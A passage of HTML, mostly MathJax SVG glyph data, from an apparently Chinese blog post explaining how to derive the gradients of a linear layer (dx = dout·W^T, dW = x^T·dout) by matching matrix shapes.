8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1369.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2425.6,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(274.5,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"1447\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(4390.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(5446.1,0)\"><g data-mml-node=\"mrow\" transform=\"translate(588.5,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1051,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1623,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g></g><rect width=\"2184\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(7870.1,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1051,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1623,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(643,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"2184\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(10571.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(11627.7,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12147.7,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12632.7,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(13204.7,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13787.9,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(14288.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1136.2,413) scale(0.707)\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<blockquote>\n<p>下面的说法可能<strong>不够正确</strong>、<strong>不够简洁</strong>，仅供参考</p>\n</blockquote>\n<p>矩阵求导的结果就是对应的雅可比矩阵。经常很难想清楚到底是左乘、右乘，要不要求转置等等。</p>\n<p>一个比较好的方法是把所有变量的 shape 写出来。</p>\n<p>x=dx: (n, m) W=dW: (m, d) out=dout=xW: (n, d) b=db: (1, d)</p>\n<p>根据链式法则，dx 一定是 dout 和 W 的乘积。看shape就直接写出来：</p>\n<p>(n, m) = (n, d) · (d, m) =&gt; <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.317ex\" height=\"2.09ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -841.7 6770 923.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1369.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2425.6,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2945.6,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3430.6,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4002.6,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4585.8,0)\"><path data-c=\"B7\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(5086,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1136.2,363) scale(0.707)\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>同理可以写出：</p>\n<p>(m, d) = (m, n) · (n, d) =&gt; <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.192ex\" height=\"2.09ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -841.7 6714.8 923.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1845.8,0)\"><path data-c=\"3D\" 